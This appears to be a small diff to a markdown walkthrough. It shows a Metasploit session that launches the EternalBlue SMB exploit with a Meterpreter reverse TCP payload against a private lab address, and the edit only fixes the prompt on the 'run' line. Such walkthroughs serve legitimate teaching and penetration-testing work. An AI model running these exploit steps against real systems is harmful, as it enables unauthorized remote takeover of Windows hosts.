@@ -120,7 +120,7 @@ msf > use 0
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
 msf exploit(windows/smb/ms17_010_eternalblue) > show options
 msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.0.4.32
-run
+msf exploit(windows/smb/ms17_010_eternalblue) > run
 ```
 
 Info:
